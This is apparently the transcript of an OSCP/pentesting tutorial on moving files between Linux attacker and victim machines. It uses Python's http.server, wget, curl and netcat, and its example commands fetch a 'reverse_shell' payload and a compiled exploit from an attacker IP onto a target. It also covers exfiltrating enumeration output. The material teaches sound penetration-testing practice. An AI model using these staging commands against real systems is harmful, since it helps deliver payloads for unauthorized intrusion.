### **[Section 1: Overview of File Transfer Requirements in Pentesting & OSCP]**

"Hello friends[1]. So in OSCP or in general pentesting engagements—I am not just talking about the exam, but generally when you perform penetration testing in infrastructure assessments across a network—you frequently need to transfer files[1]. Your attacking machine and your victim machine are often located on separate networks[1]. Even if you are performing routing or port forwarding, you still need to transfer many files from your attacking machine to the victim machine across intermediate systems and firewalls[1]. Because of this, there are numerous tools and techniques you must learn[1]. Since we deal with two primary platforms—Microsoft Windows and open-source Linux—each platform has distinct methods, tools, and techniques for file transfers[1]. You will have to do this in almost every engagement, most commonly transferring payloads created on your attacking machine to the target to execute reverse shells, or transferring compiled exploits, executables, ELF binaries, or text data files between different systems[1][2]."

---

### **[Section 2: Linux-to-Linux Scenarios & Directional Transfers]**

"There are several techniques you need to study[2]. Some methods work almost everywhere, but occasionally a specific utility may not be installed, requiring you to use whatever alternative utility is available on the host[2]. I will cover the most essential methods—specifically for OSCP requirements—focusing on three core techniques for both Linux and Windows platforms[2].

First, let's discuss **Linux-to-Linux file transfers**, where both the attacking host and the victim target are Linux systems[2][3]. File transfers occur in two directions: **Attacker-to-Victim** or **Victim-to-Attacker**[3]. Most commonly, you perform Attacker-to-Victim transfers for payloads and binaries[3]. However, when running local enumeration utilities on a target host, you often need to exfiltrate the output report back to your attacking machine for offline analysis[3]. Linux makes this straightforward because identical tools are usually installed on both ends[3]. Here, my Kali attacking machine is ready, and I am logged into the target Linux machine via SSH[3]."

---

### **[Section 3: Hosting Web Servers & Transferring via** **wget** **]**

"The most common CLI tools for downloading files in Linux are **wget** and **curl**[4]. While installed by default across most distributions, they are not strictly POSIX standards, though modern distros almost always include at least one of them[4]. To transfer a file, you must first host a web server on the source machine containing the file[4].

To demonstrate an Attacker-to-Victim transfer, I have sample files and compiled C exploits (such as `40616.c`) on my attacking host[4]. To serve them, you can spawn an HTTP server on port 80[5]. While Linux includes Apache (`/var/www/html`), Python provides a much more flexible option via its built-in `http.server` module[5][7]. Python's `http.server` can be launched in any directory, instantly making that folder the web root[7]:

```
python3 -m http.server 80

```

Once the server is running on the attacking host, switch to the victim machine[6][7]. Ensure you navigate to a directory where your current user has write permissions (such as `/tmp`)[6]. Then run `wget`, providing the attacker's IP address, filename, and the `-O` flag to specify the local output path[6]:

```
wget http://10.8.63.160/sample.txt -O sample.txt

```

This successfully downloads the file (e.g., `sample.txt` or compiled exploit `40616.c`) to the target machine[6][8]. `wget` supports advanced options like recursive directory downloads, FTP retrieval, custom HTTP headers, proxy settings, cookies, User-Agent strings, and authentication flags[9]."

---

### **[Section 4: Downloading Files via** **curl** **]**

"The second primary utility is **curl**[10]. The command structure is very similar, but `curl` requires a lowercase `-o` flag to specify the output filename[10]:

```
curl http://10.8.63.160/reverse_shell -o reverse_shell

```

`curl` offers robust features, including built-in support for SOCKS proxies, custom HTTP headers, SSL/TLS handling, and User-Agent spoofing—making it particularly useful when routing traffic across multi-homed pivot networks[10][11]."

---

### **[Section 5: Raw TCP File Transfers via Netcat (** **nc** **)]**

"If neither `wget` nor `curl` is present on the target system, you can use **Netcat (** **nc** **)**[12]. Instead of setting up a traditional reverse shell listener, you set up a file-receiver listener using standard stream redirection[12][13]:

1. **On the receiving (Victim) machine**, start Netcat listening on a port and redirect incoming socket output into a destination file[12][13]:

```
nc -lvnp 4444 &gt; reverse_shell

```

1. **On the sending (Attacker) machine**, connect to the victim's IP address and port, piping the source file into the connection[13]:

```
nc 10.10.79.0 4444 &lt; reverse_shell

```

The file data transfers directly across the raw TCP socket[13]. Although Netcat does not display a progress bar, checking the file size on the receiver confirms when the transfer is complete[14]."
